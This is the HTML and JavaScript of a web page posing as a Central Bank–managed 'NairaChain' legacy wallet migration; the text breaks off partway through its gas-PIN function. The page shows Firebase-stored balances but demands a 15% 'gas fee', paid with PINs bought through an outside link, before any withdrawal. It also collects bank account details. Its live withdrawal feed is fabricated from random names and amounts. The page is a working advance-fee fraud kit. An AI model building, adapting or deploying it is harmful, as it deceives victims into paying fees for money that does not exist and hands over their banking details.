<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
<title>NairaChain – Legacy Wallet Withdrawal</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
  background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
  color: #fff;
  min-height: 100vh;
  padding: 0;
}

.navbar {
  background: rgba(30, 41, 59, 0.95);
  backdrop-filter: blur(10px);
  border-bottom: 1px solid rgba(255, 255, 255, 0.1);
  padding: 12px 20px;
  position: sticky;
  top: 0;
  z-index: 999;
  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
}

.navbar-content {
  max-width: 1200px;
  margin: 0 auto;
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 16px;
}

.navbar-left {
  display: flex;
  align-items: center;
  gap: 12px;
  flex: 1;
}

.navbar-logo {
  width: 40px;
  height: 40px;
  background: linear-gradient(135deg, #10b981 0%, #059669 100%);
  border-radius: 10px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 20px;
  color: #fff;
  flex-shrink: 0;
}

.navbar-brand {
  font-weight: 700;
  font-size: 16px;
  display: none;
}

.live-activity {
  flex: 1;
  max-width: 500px;
  background: rgba(16, 185, 129, 0.1);
  border: 1px solid rgba(16, 185, 129, 0.3);
  border-radius: 10px;
  padding: 8px 12px;
  cursor: pointer;
  transition: all 0.3s;
  position: relative;
}

.live-activity:hover {
  background: rgba(16, 185, 129, 0.15);
}

.activity-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 8px;
}

.activity-current {
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 13px;
  flex: 1;
  overflow: hidden;
}

.live-dot {
  width: 8px;
  height: 8px;
  background: #10b981;
  border-radius: 50%;
  animation: blink 2s infinite;
  flex-shrink: 0;
}

@keyframes blink {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.3; }
}

.activity-text {
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  font-size: 12px;
}

.toggle-icon {
  font-size: 12px;
  transition: transform 0.3s;
  flex-shrink: 0;
  color: #10b981;
}

.toggle-icon.expanded {
  transform: rotate(180deg);
}

.activity-dropdown {
  position: absolute;
  top: calc(100% + 8px);
  left: 0;
  right: 0;
  background: rgba(30, 41, 59, 0.98);
  backdrop-filter: blur(10px);
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 12px;
  padding: 12px;
  max-height: 300px;
  overflow-y: auto;
  box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
  display: none;
  animation: slideDown 0.3s ease-out;
}

@keyframes slideDown {
  from {
    opacity: 0;
    transform: translateY(-10px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

.activity-dropdown.show {
  display: block;
}

.activity-dropdown::-webkit-scrollbar {
  width: 6px;
}

.activity-dropdown::-webkit-scrollbar-track {
  background: rgba(255, 255, 255, 0.05);
  border-radius: 10px;
}

.activity-dropdown::-webkit-scrollbar-thumb {
  background: rgba(16, 185, 129, 0.5);
  border-radius: 10px;
}

.navbar-right {
  display: flex;
  align-items: center;
  gap: 12px;
}

.user-info {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 8px 12px;
  background: rgba(255, 255, 255, 0.05);
  border-radius: 8px;
  font-size: 12px;
}

.logout-btn {
  padding: 8px 16px;
  background: rgba(239, 68, 68, 0.2);
  border: 1px solid rgba(239, 68, 68, 0.4);
  border-radius: 8px;
  color: #fff;
  font-size: 13px;
  cursor: pointer;
  transition: all 0.3s;
  display: flex;
  align-items: center;
  gap: 6px;
  width: auto;
}

.logout-btn:hover {
  background: rgba(239, 68, 68, 0.3);
  transform: translateY(-1px);
}

@media (min-width: 640px) {
  .navbar-brand {
    display: block;
  }
  .navbar-content {
    gap: 24px;
  }
  .live-activity {
    max-width: none;
  }
}

@media (max-width: 480px) {
  .navbar-content {
    flex-wrap: wrap;
    justify-content: center;
  }
  .navbar-left {
    flex-basis: 100%;
    justify-content: center;
  }
  .navbar-right {
    flex-basis: 100%;
    justify-content: center;
  }
  .live-activity {
    max-width: none;
  }
}

.container {
  max-width: 1200px;
  margin: auto;
  padding: 20px 16px;
}

@media (max-width: 768px) {
  .container {
    max-width: 100%;
    padding: 16px 12px;
  }
}

@media (max-width: 480px) {
  .container {
    padding: 12px 8px;
  }
}

.header {
  text-align: center;
  margin-bottom: 32px;
}

.logo {
  width: 60px;
  height: 60px;
  background: linear-gradient(135deg, #10b981 0%, #059669 100%);
  border-radius: 16px;
  display: inline-flex;
  align-items: center;
  justify-content: center;
  font-size: 32px;
  margin-bottom: 12px;
  box-shadow: 0 8px 16px rgba(16, 185, 129, 0.3);
  color: #fff;
}

h2 {
  font-size: 24px;
  font-weight: 700;
  margin-bottom: 8px;
  background: linear-gradient(135deg, #10b981 0%, #34d399 100%);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
}

.subtitle {
  color: #94a3b8;
  font-size: 14px;
}

.card {
  background: rgba(30, 41, 59, 0.8);
  backdrop-filter: blur(10px);
  border-radius: 20px;
  padding: 24px;
  margin-bottom: 20px;
  border: 1px solid rgba(255, 255, 255, 0.1);
  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
  transition: transform 0.2s, box-shadow 0.2s;
}

.card:hover {
  transform: translateY(-2px);
  box-shadow: 0 8px 12px rgba(0, 0, 0, 0.2);
}

.alert-info {
  background: rgba(59, 130, 246, 0.1);
  border: 1px solid rgba(59, 130, 246, 0.3);
  border-radius: 12px;
  padding: 16px;
  margin-bottom: 20px;
  font-size: 13px;
  line-height: 1.6;
}

.alert-warning {
  background: rgba(245, 158, 11, 0.1);
  border: 1px solid rgba(245, 158, 11, 0.3);
  border-radius: 12px;
  padding: 16px;
  margin-bottom: 20px;
  font-size: 13px;
}

.input-group {
  position: relative;
  margin-bottom: 16px;
}

.input-icon {
  position: absolute;
  left: 16px;
  top: 50%;
  transform: translateY(-50%);
  font-size: 18px;
  color: #10b981;
  opacity: 0.8;
}

input, select {
  width: 100%;
  padding: 14px 16px 14px 48px;
  border-radius: 12px;
  border: 2px solid rgba(255, 255, 255, 0.1);
  background: rgba(15, 23, 42, 0.6);
  color: #fff;
  font-size: 15px;
  transition: all 0.3s;
  outline: none;
}

input:focus, select:focus {
  border-color: #10b981;
  background: rgba(15, 23, 42, 0.8);
  box-shadow: 0 0 0 4px rgba(16, 185, 129, 0.1);
}

input::placeholder {
  color: #64748b;
}

select {
  cursor: pointer;
  appearance: none;
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%2394a3b8' d='M6 9L1 4h10z'/%3E%3C/svg%3E");
  background-repeat: no-repeat;
  background-position: right 16px center;
}

button {
  width: 100%;
  padding: 16px;
  border-radius: 12px;
  border: none;
  background: linear-gradient(135deg, #10b981 0%, #059669 100%);
  color: #fff;
  font-weight: 600;
  font-size: 16px;
  cursor: pointer;
  transition: all 0.3s;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
}

button:hover {
  transform: translateY(-2px);
  box-shadow: 0 6px 16px rgba(16, 185, 129, 0.4);
}

button:active {
  transform: translateY(0);
}

button:disabled {
  opacity: 0.5;
  cursor: not-allowed;
  transform: none;
}

button.secondary {
  background: rgba(71, 85, 105, 0.5);
  box-shadow: none;
}

button.secondary:hover {
  background: rgba(71, 85, 105, 0.7);
}

.balance-card {
  background: linear-gradient(135deg, #10b981 0%, #059669 100%);
  position: relative;
  overflow: hidden;
}

.balance-card::before {
  content: '';
  position: absolute;
  top: -50%;
  right: -50%;
  width: 200%;
  height: 200%;
  background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
  animation: pulse 4s ease-in-out infinite;
}

@keyframes pulse {
  0%, 100% { transform: scale(1); opacity: 0.5; }
  50% { transform: scale(1.1); opacity: 0.3; }
}

.balance-header {
  display: flex;
  align-items: center;
  gap: 8px;
  margin-bottom: 12px;
  font-size: 14px;
  opacity: 0.9;
}

.balance-amount {
  font-size: 36px;
  font-weight: 700;
  margin-bottom: 16px;
  letter-spacing: -1px;
}

.gas-info {
  background: rgba(0, 0, 0, 0.2);
  padding: 12px;
  border-radius: 10px;
  margin-bottom: 12px;
}

.gas-row {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 8px;
}

.gas-row:last-child {
  margin-bottom: 0;
}

.gas-label {
  font-size: 13px;
  opacity: 0.9;
}

.gas-amount {
  font-weight: 600;
  font-size: 16px;
}

.progress-container {
  margin-top: 12px;
}

.progress-bar {
  width: 100%;
  height: 8px;
  background: rgba(0, 0, 0, 0.3);
  border-radius: 10px;
  overflow: hidden;
  margin-bottom: 8px;
}

.progress-fill {
  height: 100%;
  background: linear-gradient(90deg, #fbbf24, #f59e0b);
  border-radius: 10px;
  transition: width 0.5s ease;
}

.progress-text {
  font-size: 12px;
  opacity: 0.8;
  text-align: center;
}

.small {
  font-size: 13px;
  opacity: 0.7;
  margin-bottom: 8px;
}

.feed-item {
  border-bottom: 1px solid rgba(255, 255, 255, 0.1);
  padding: 10px 0;
  display: flex;
  align-items: center;
  gap: 10px;
  animation: slideIn 0.3s ease-out;
  font-size: 12px;
}

.feed-item:last-child {
  border-bottom: none;
}

@keyframes slideIn {
  from {
    opacity: 0;
    transform: translateX(-20px);
  }
  to {
    opacity: 1;
    transform: translateX(0);
  }
}

.feed-icon {
  width: 32px;
  height: 32px;
  background: rgba(16, 185, 129, 0.2);
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
  color: #10b981;
  font-size: 14px;
}

.feed-content {
  flex: 1;
}

.feed-name {
  font-weight: 600;
  font-size: 13px;
}

.feed-details {
  font-size: 11px;
  opacity: 0.6;
  margin-top: 2px;
}

.modal {
  position: fixed;
  inset: 0;
  background: rgba(0, 0, 0, 0.8);
  backdrop-filter: blur(4px);
  display: none;
  justify-content: center;
  align-items: center;
  z-index: 1000;
  animation: fadeIn 0.3s ease-out;
}

@keyframes fadeIn {
  from { opacity: 0; }
  to { opacity: 1; }
}

.modal-box {
  background: linear-gradient(135deg, #1e293b 0%, #334155 100%);
  padding: 28px;
  border-radius: 20px;
  width: 90%;
  max-width: 400px;
  border: 1px solid rgba(255, 255, 255, 0.1);
  box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
  animation: slideUp 0.3s ease-out;
}

@keyframes slideUp {
  from {
    opacity: 0;
    transform: translateY(20px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

.modal-header {
  display: flex;
  align-items: center;
  gap: 12px;
  margin-bottom: 20px;
}

.modal-icon {
  width: 48px;
  height: 48px;
  background: linear-gradient(135deg, #10b981 0%, #059669 100%);
  border-radius: 12px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 24px;
  color: #fff;
}

.modal-title {
  font-size: 20px;
  font-weight: 700;
}

.alert {
  background: rgba(239, 68, 68, 0.1);
  border: 1px solid rgba(239, 68, 68, 0.3);
  padding: 12px;
  border-radius: 10px;
  margin-bottom: 16px;
  font-size: 13px;
  display: flex;
  align-items: center;
  gap: 8px;
}

.alert i {
  color: #fbbf24;
  font-size: 16px;
}

.status-badge {
  display: inline-block;
  padding: 4px 12px;
  border-radius: 20px;
  font-size: 12px;
  font-weight: 600;
  background: rgba(16, 185, 129, 0.2);
  color: #10b981;
  border: 1px solid rgba(16, 185, 129, 0.3);
}

.divider {
  height: 1px;
  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
  margin: 20px 0;
}

.info-box {
  background: rgba(59, 130, 246, 0.1);
  border: 1px solid rgba(59, 130, 246, 0.3);
  border-radius: 12px;
  padding: 12px;
  margin-bottom: 16px;
  font-size: 13px;
}

.success-box {
  background: rgba(16, 185, 129, 0.1);
  border: 1px solid rgba(16, 185, 129, 0.3);
  border-radius: 12px;
  padding: 12px;
  margin-bottom: 16px;
  font-size: 13px;
}

.stats-card {
  background: linear-gradient(135deg, #059669 0%, #10b981 100%);
  position: relative;
  overflow: hidden;
}

.stats-card::before {
  content: '';
  position: absolute;
  top: -50%;
  right: -50%;
  width: 200%;
  height: 200%;
  background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
  animation: pulse 4s ease-in-out infinite;
}

.stats-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 8px;
  margin-bottom: 12px;
  font-size: 14px;
  opacity: 0.9;
}

.stats-logo {
  width: 60px;
  height: 60px;
  background: #fff;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
}

.stats-logo img {
  max-width: 100%;
  max-height: 100%;
}

.stats-info {
  background: rgba(0, 0, 0, 0.2);
  padding: 12px;
  border-radius: 10px;
  margin-bottom: 12px;
}

@media (max-width: 480px) {
  .balance-amount {
    font-size: 28px;
  }
  
  .card {
    padding: 20px;
  }

  h2 {
    font-size: 20px;
  }

  .subtitle {
    font-size: 12px;
  }

  .alert-info, .alert-warning {
    font-size: 12px;
    padding: 12px;
  }

  input, select {
    font-size: 14px;
    padding: 12px 14px 12px 44px;
  }

  .input-icon {
    font-size: 16px;
    left: 14px;
  }

  button {
    font-size: 14px;
    padding: 14px;
  }

  .modal-box {
    padding: 20px;
  }

  .modal-title {
    font-size: 18px;
  }
  
  .stats-header {
    flex-direction: column;
    align-items: flex-start;
  }
  
  .stats-logo {
    margin-bottom: 12px;
  }
}
</style>
</head>

<body>

<!-- NAVIGATION BAR -->
<nav class="navbar" id="navbar" style="display:none">
  <div class="navbar-content">
    <div class="navbar-left">
      
      <div class="live-activity" id="liveActivity" onclick="toggleActivityDropdown()">
        <div class="activity-header">
          <div class="activity-current">
            <p>Withdrawed</p><span class="live-dot"></span>
            <span class="activity-text" id="currentActivity">Loading...</span>
          </div>
          <i class="fas fa-chevron-down toggle-icon" id="toggleIcon"></i>
        </div>
        
        <div class="activity-dropdown" id="activityDropdown"></div>
      </div>
    </div>
    
</nav>

<div class="container">

<div class="header">
  <h2>Capital Withdraw & Wallet Migration</h2>
  <p class="subtitle">Secure withdrawal & account migration</p>
</div>

<!-- STATISTICS DASHBOARD -->
<div class="card stats-card" id="statsCard">
  <div class="stats-header">
    <span><i class="fas fa-chart-bar"></i> Withdrawal Statistics (CBN Managed)</span>
    <div class="stats-logo">
      <img id="cbn-logo" src="https://raw.githubusercontent.com/rec-link-io/BC.Plus/387912a689a54b2dcdcccf1306cd59489e712c0e/assets/centralBank.e14647d7.png" alt="CBN Logo">
    </div>
  </div>
  
  <div class="stats-info">
    <div class="gas-row">
      <div class="gas-label"><i class="fas fa-money-bill"></i> Total Capital Allocated by CBN</div>
      <div class="gas-amount">₦600,000,000</div>
    </div>
    <div class="gas-row">
      <div class="gas-label"><i class="fas fa-check-circle"></i> Total Withdrawn Successfully</div>
      <div class="gas-amount" style="color: #34d399">₦216,000,000</div>
    </div>
    <div class="gas-row">
      <div class="gas-label"><i class="fas fa-hourglass-half"></i> Remaining Capital</div>
      <div class="gas-amount" style="color: #fbbf24">₦384,000,000</div>
    </div>
  </div>
</div>

<!-- NOTICE -->
<div class="alert-info" id="noticeCard">
  <strong><i class="fas fa-info-circle"></i> Important Notice:</strong><br>
  This is a mandatory migration for legacy NairaPOS/NairaChain users. You must withdraw your full balance and maintain a 15% minimum active balance to continue using your account on the new system. Minimum withdrawal balance for direct withdrawal is ₦100,000. If your capital is below ₦100,000 and you wish to withdraw, please use the Marketplace option instead.
  <br><br>
  <strong>Deadline:</strong> February 26, 2026
</div>

<!-- LOGIN -->
<div class="card" id="loginCard">
  <div class="small"><i class="fas fa-shield-alt"></i> Secure Login</div>
  <div class="input-group">
    <i class="fas fa-key input-icon"></i>
    <input id="privateKey" type="password" placeholder="Enter your public key "/>
  </div>
  <button onclick="login()">
    <span>Login to Wallet</span>
    <i class="fas fa-arrow-right"></i>
  </button>
</div>

<!-- WALLET INFO -->
<div class="card balance-card" id="walletCard" style="display:none">
  <div class="balance-header">
    <i class="fas fa-coins"></i>
    <span>Total Legacy Balance</span>
  </div>
  <div class="balance-amount" id="balanceText">₦0</div>
  
  <div class="gas-info">
    <div class="gas-row">
      <div class="gas-label"><i class="fas fa-bolt"></i> Required Gas Fee (15%)</div>
      <div class="gas-amount">₦<span id="gasRequired">0</span></div>
    </div>
    <div class="gas-row">
      <div class="gas-label"><i class="fas fa-check-circle"></i> Gas Paid</div>
      <div class="gas-amount" style="color: #34d399">₦<span id="gasPaid">0</span></div>
    </div>
    <div class="gas-row">
      <div class="gas-label"><i class="fas fa-hourglass-half"></i> Gas Remaining</div>
      <div class="gas-amount" style="color: #fbbf24">₦<span id="gasRemaining">0</span></div>
    </div>
  </div>

  <div class="progress-container" id="progressContainer">
    <div class="progress-bar">
      <div class="progress-fill" id="progressFill" style="width: 0%"></div>
    </div>
    <div class="progress-text" id="progressText">Gas payment: 0%</div>
  </div>
</div>

<!-- WITHDRAW FORM -->
<div class="card" id="withdrawCard" style="display:none">
  <div class="small"><i class="fas fa-money-bill-wave"></i> Withdrawal Details</div>
  
  <div class="alert-warning">
    <i class="fas fa-exclamation-triangle"></i> You must withdraw your <strong>FULL BALANCE</strong>. After paying the complete 15% gas fee, both your withdrawal amount and the gas fee will be credited to your new wallet.
  </div>

  <div class="input-group">
    <i class="fas fa-university input-icon"></i>
    <select id="bank">
      <option value="">Select Bank</option>
      <option>Access Bank</option>
      <option>Citibank Nigeria</option>
      <option>Ecobank Nigeria</option>
      <option>Fidelity Bank</option>
      <option>First Bank of Nigeria</option>
      <option>First City Monument Bank (FCMB)</option>
      <option>Globus Bank</option>
      <option>Guaranty Trust Bank (GTBank)</option>
      <option>Heritage Bank</option>
      <option>Keystone Bank</option>
      <option>Kuda Bank</option>
      <option>Opay</option>
      <option>Palmpay</option>
      <option>Polaris Bank</option>
      <option>Providus Bank</option>
      <option>Stanbic IBTC Bank</option>
      <option>Standard Chartered Bank</option>
      <option>Sterling Bank</option>
      <option>SunTrust Bank</option>
      <option>Union Bank of Nigeria</option>
      <option>United Bank for Africa (UBA)</option>
      <option>Unity Bank</option>
      <option>Wema Bank</option>
      <option>Zenith Bank</option>
    </select>
  </div>

  <div class="input-group">
    <i class="fas fa-hashtag input-icon"></i>
    <input id="account" type="text" placeholder="Account Number" maxlength="10"/>
  </div>

  <div class="input-group">
    <i class="fas fa-user input-icon"></i>
    <input id="accountName" type="text" placeholder="Account Name"/>
  </div>

  <button onclick="startWithdraw()" id="withdrawBtn">
    <span>Proceed to Gas Payment</span>
    <i class="fas fa-arrow-right"></i>
  </button>
</div>

<!-- ACTIVITY FEED -->
<div class="card" style="display:none" id="activityCard">
  <div style="font-size: 12px; opacity: 0.6; text-align: center;">
    <div class="navbar-right">
      <div class="user-info">
        <i class="fas fa-user-circle"></i>
        <span id="userDisplay">User</span>
      </div>
      <button class="logout-btn" onclick="logout()">
        <i class="fas fa-sign-out-alt"></i>
        <span>Logout</span>
      </button>
    </div>
  </div>
  </div>
</div>

</div>

<!-- GAS PIN MODAL -->
<div class="modal" id="gasModal">
  <div class="modal-box">
    <div class="modal-header">
      <div class="modal-icon"><i class="fas fa-bolt"></i></div>
      <div class="modal-title">Enter Gas PIN</div>
    </div>
    
    <div class="info-box" id="gasStatus">
      <strong>Gas Payment Progress:</strong><br>
      Paid: ₦<span id="modalGasPaid">0</span><br>
      Remaining: ₦<span id="modalGasRemaining">0</span>
    </div>
    
    <div class="input-group">
      <i class="fas fa-keyboard input-icon"></i>
      <input type="text" id="gasPin" placeholder="Enter Gas PIN" maxlength="20"/>
    </div>
    
    <button onclick="submitGasPin()">
      <span>Submit Gas Payment</span>
      <i class="fas fa-check"></i>
    </button>
    
    <div class="divider"></div>
    
    <button class="secondary" onclick="closeGasModal()">
      <i class="fas fa-times"></i>
      <span>Cancel</span>
    </button>

    <div class="divider"></div>
    
    <div style="text-align: center; font-size: 12px; opacity: 0.7;">
      Don't have gas? <a href="https://unrivaled-kangaroo-2def37.netlify.app/" style="color: #10b981; text-decoration: underline;">Buy Gas Credits</a>
    </div>
  </div>
</div>

<!-- SUCCESS MODAL -->
<div class="modal" id="successModal">
  <div class="modal-box">
    <div style="text-align: center;">
      <div style="width: 80px; height: 80px; background: linear-gradient(135deg, #10b981 0%, #059669 100%); border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 40px; margin-bottom: 20px;">
        <i class="fas fa-check"></i>
      </div>
      <h3 style="font-size: 22px; margin-bottom: 12px;">Migration Successful!</h3>
      <p style="font-size: 14px; opacity: 0.8; margin-bottom: 20px;">
        Your withdrawal has been processed and your new wallet has been credited.
      </p>
      
      <div class="success-box">
        <div style="margin-bottom: 8px;">
          <strong>Withdrawn:</strong> ₦<span id="successWithdrawn">0</span>
        </div>
        <div style="margin-bottom: 8px;">
          <strong>New Balance:</strong> ₦<span id="successNewBalance">0</span>
        </div>
        <div>
          <strong>Bank:</strong> <span id="successBank">-</span>
        </div>
      </div>

      <button onclick="location.reload()">
        <i class="fas fa-home"></i>
        <span>Done</span>
      </button>
    </div>
  </div>
</div>


<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
import { getDatabase, ref, get, update, push, set } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyDh2RTAaezQ-XpoS7ZdjAQAKkwwelm41Qo",
  authDomain: "bcplus-248f5.firebaseapp.com",
  databaseURL: "https://bcplus-248f5-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "bcplus-248f5",
  storageBucket: "bcplus-248f5.appspot.com",
  messagingSenderId: "1051933304496",
  appId: "1:1051933304496:web:318f2ac7c5e3452fdefd75"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

let currentUser = null;
let mainBalance = 0;
let gasRequired = 0;
let gasPaidTotal = 0;
let withdrawalData = {};
let activityList = [];
let currentActivityIndex = 0;
let isDropdownOpen = false;

/* AUTO-LOGIN ON PAGE LOAD */
window.addEventListener('DOMContentLoaded', async function() {
  const savedUser = localStorage.getItem('nairachain_current_user');
  
  if (savedUser) {
    // Auto-login
    privateKey.value = savedUser;
    await login(true); // Pass true to indicate auto-login
  }
  
  // Start activity feed
  generateActivityList();
  startActivityRotation();
});

/* GENERATE LARGE ACTIVITY LIST */
function generateActivityList() {
  const names = [
    "Adeyemi O.", "Chioma N.", "Ibrahim M.", "Folake A.", "Emeka C.", 
    "Aisha B.", "Tunde L.", "Grace K.", "Yusuf H.", "Blessing U.",
    "Chidi E.", "Ngozi P.", "Muhammed S.", "Joy A.", "Kunle D.",
    "Hauwa I.", "Segun M.", "Amarachi O.", "Bashir Y.", "Funke T.",
    "Oluwaseun K.", "Fatima G.", "Babatunde R.", "Chinwe V.", "Musa A.",
    "Adeola W.", "Zainab M.", "Ifeanyi C.", "Kemi B.", "Abdullahi N.",
    "Chiamaka E.", "Usman F.", "Titilayo S.", "Ahmed L.", "Nneka J.",
    "Rasheed K.", "Comfort O.", "Yakubu D.", "Ronke H.", "Suleiman B.",
    "Amaka U.", "Damilola A.", "Halima R.", "Chukwudi M.", "Bisi L.",
    "Sadiq E.", "Josephine N.", "Kazeem O.", "Ebere C.", "Lawal M."
  ];
  
  const banks = [
    "GTBank", "Access Bank", "UBA", "First Bank", "Zenith", 
    "Opay", "Palmpay", "Kuda", "FCMB", "Fidelity",
    "Sterling", "Wema", "Union Bank", "Stanbic IBTC", "Ecobank"
  ];

  activityList = [];
  
  for (let i = 0; i < 50; i++) {
    const name = names[Math.floor(Math.random() * names.length)];
    const bank = banks[Math.floor(Math.random() * banks.length)];
    const amt = Math.floor(Math.random() * 800000) + 50000;
    
    activityList.push({
      name,
      bank,
      amount: amt
    });
  }
  
  // Shuffle the list
  activityList.sort(() => Math.random() - 0.5);
}

/* ROTATE CURRENT ACTIVITY */
function startActivityRotation() {
  updateCurrentActivity();
  setInterval(updateCurrentActivity, 4000); // Change every 4 seconds
}

function updateCurrentActivity() {
  const activity = activityList[currentActivityIndex];
  document.getElementById('currentActivity').innerHTML = `
    <strong>${activity.name}</strong> migrated ₦${activity.amount.toLocaleString()} → ${activity.bank}
  `;
  
  currentActivityIndex = (currentActivityIndex + 1) % activityList.length;
}

/* TOGGLE ACTIVITY DROPDOWN */
window.toggleActivityDropdown = function() {
  const dropdown = document.getElementById('activityDropdown');
  const icon = document.getElementById('toggleIcon');
  
  isDropdownOpen = !isDropdownOpen;
  
  if (isDropdownOpen) {
    dropdown.classList.add('show');
    icon.classList.add('expanded');
    renderActivityDropdown();
  } else {
    dropdown.classList.remove('show');
    icon.classList.remove('expanded');
  }
}

/* RENDER ALL ACTIVITIES IN DROPDOWN */
function renderActivityDropdown() {
  const dropdown = document.getElementById('activityDropdown');
  dropdown.innerHTML = '';
  
  activityList.forEach(activity => {
    const item = document.createElement('div');
    item.className = 'feed-item';
    item.innerHTML = `
      <div class="feed-icon"><i class="fas fa-check-circle"></i></div>
      <div class="feed-content">
        <div class="feed-name">${activity.name}</div>
        <div class="feed-details">Migrated ₦${activity.amount.toLocaleString()} → ${activity.bank}</div>
      </div>
    `;
    dropdown.appendChild(item);
  });
}

/* CLOSE DROPDOWN WHEN CLICKING OUTSIDE */
document.addEventListener('click', function(e) {
  const liveActivity = document.getElementById('liveActivity');
  if (liveActivity && !liveActivity.contains(e.target) && isDropdownOpen) {
    toggleActivityDropdown();
  }
});

/* LOGIN WITH public key  */
window.login = async function(isAutoLogin = false) {
  const key = privateKey.value.trim();
  
  if (!key) {
    if (!isAutoLogin) {
      alert("⚠️ Please enter your public key ");
    }
    return;
  }

  const snap = await get(ref(db, "users/" + key));
  if (!snap.exists()) {
    if (!isAutoLogin) {
      alert("❌ Invalid public key . Please check and try again.");
    }
    // Clear invalid saved user
    localStorage.removeItem('nairachain_current_user');
    return;
  }

  currentUser = key;
  const userData = snap.val();
  mainBalance = userData.mainBalance || 0;

  if (mainBalance <= 0 && !isAutoLogin) {
    alert("❌ Your account has no balance to withdraw.");
    return;
  }

  // Save user session
  localStorage.setItem('nairachain_current_user', currentUser);

  // Calculate required gas (15%)
  gasRequired = Math.floor(mainBalance * 0.15);

  // Load existing gas payment progress from localStorage
  const storageKey = `withdrawal_gas_${currentUser}`;
  const savedProgress = localStorage.getItem(storageKey);
  
  if (savedProgress) {
    const parsed = JSON.parse(savedProgress);
    gasPaidTotal = parsed.gasPaidTotal || 0;
    withdrawalData = parsed.withdrawalData || {};
  }

  // Show navbar and hide login
  document.getElementById('navbar').style.display = 'block';
  document.getElementById('userDisplay').innerText = currentUser.substring(0, 8) + '...';
  
  loginCard.style.display = "none";
  walletCard.style.display = "block";
  withdrawCard.style.display = "block";
  activityCard.style.display = "block";

  updateUI();

  if (mainBalance < 100000) {
    document.getElementById('withdrawBtn').disabled = true;
    document.getElementById('withdrawBtn').innerHTML = '<span>Insufficient Balance</span><i class="fas fa-exclamation-triangle"></i>';
  }
}

/* UPDATE UI */
function updateUI() {
  balanceText.innerText = "₦" + mainBalance.toLocaleString();
  document.getElementById('gasRequired').innerText = gasRequired.toLocaleString();
  document.getElementById('gasPaid').innerText = gasPaidTotal.toLocaleString();
  
  const remaining = Math.max(0, gasRequired - gasPaidTotal);
  document.getElementById('gasRemaining').innerText = remaining.toLocaleString();

  // Update progress bar
  const progress = Math.min(100, (gasPaidTotal / gasRequired) * 100);
  document.getElementById('progressFill').style.width = progress + '%';
  document.getElementById('progressText').innerText = `Gas payment: ${Math.floor(progress)}%`;

  // Update button text based on progress
  const btn = document.getElementById('withdrawBtn');
  if (remaining === 0) {
    btn.innerHTML = '<span>Complete Withdrawal</span><i class="fas fa-check-circle"></i>';
  } else {
    btn.innerHTML = '<span>Pay Gas Fee (₦' + remaining.toLocaleString() + ' remaining)</span><i class="fas fa-arrow-right"></i>';
  }
}

/* START WITHDRAW PROCESS */
window.startWithdraw = function() {
  if (mainBalance < 100000) {
    alert("❌ You have insufficient balance to withdraw. Minimum withdrawal balance is ₦100,000. If your capital is below this amount, please use the Marketplace to withdraw.");
    return;
  }

  const bank = document.getElementById("bank").value;
  const account = document.getElementById("account").value;
  const accountName = document.getElementById("accountName").value;

  if (!bank) {
    alert("⚠️ Please select a bank");
    return;
  }

  if (!account || account.length !== 10) {
    alert("⚠️ Please enter a valid 10-digit account number");
    return;
  }

  if (!accountName || accountName.trim().length < 3) {
    alert("⚠️ Please enter account name");
    return;
  }

  // Store withdrawal details
  withdrawalData = {
    bank,
    account,
    accountName,
    amount: mainBalance
  };

  // Save to localStorage
  saveProgress();

  const remaining = gasRequired - gasPaidTotal;

  if (remaining > 0) {
    // Still need to pay gas
    document.getElementById('modalGasPaid').innerText = gasPaidTotal.toLocaleString();
    document.getElementById('modalGasRemaining').innerText = remaining.toLocaleString();
    gasModal.style.display = "flex";
  } else {
    // Gas fully paid, complete withdrawal
    completeWithdrawal();
  }
}

/* SUBMIT GAS PIN */
window.submitGasPin = async function() {
  const pin = gasPin.value.trim();
  
  if (!pin) {
    alert("⚠️ Please enter a gas PIN");
    return;
  }

  // Validate PIN in database
  const pinSnap = await get(ref(db, "validGasPins/" + pin));
  
  if (!pinSnap.exists()) {
    alert("❌ Invalid Gas PIN. Please check and try again.");
    return;
  }

  const pinData = pinSnap.val();

  // Check if PIN is already used
  if (pinData.used) {
    alert("❌ This Gas PIN has already been used.");
    return;
